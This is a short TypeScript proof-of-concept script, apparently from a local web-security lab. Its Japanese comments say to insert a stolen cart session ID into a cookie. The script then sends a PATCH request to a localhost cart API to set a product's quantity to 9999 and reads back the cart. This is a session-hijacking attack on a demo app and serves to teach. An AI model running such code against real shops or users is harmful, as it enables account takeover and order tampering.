const main = async (): Promise<void> => {
  const url = "http://localhost:3000/api/cart";

  // ここに窃取したセッションIDをセット
  const cartSessionId = "00000000-0000-0000-0000-000000000000";

  const cookie = `cart_session_id=${cartSessionId}`;

  const payload = {
    productId: "A-002",
    quantity: 9999,
  };

  const patchRes = await fetch(url, {
    method: "PATCH",
    headers: {
      "Content-Type": "application/json",
      Cookie: cookie,
    },
    body: JSON.stringify(payload),
  });

  console.log(`ステータスコード: ${patchRes.status}`);

  const patchJson = await patchRes.json();
  const isSuccess = patchJson.success;

  console.log(`res.success: ${isSuccess}`);

  if (isSuccess) {
    const getRes = await fetch(url, {
      headers: {
        Cookie: cookie,
      },
    });

    const getJson = await getRes.json();

    console.log(`カートの内容: ${JSON.stringify(getJson.payload, null, 2)}`);
  }
};

void main();

// 実行するには以下のコマンドを使用してください。
// npx tsx .lab/set-cart.ts
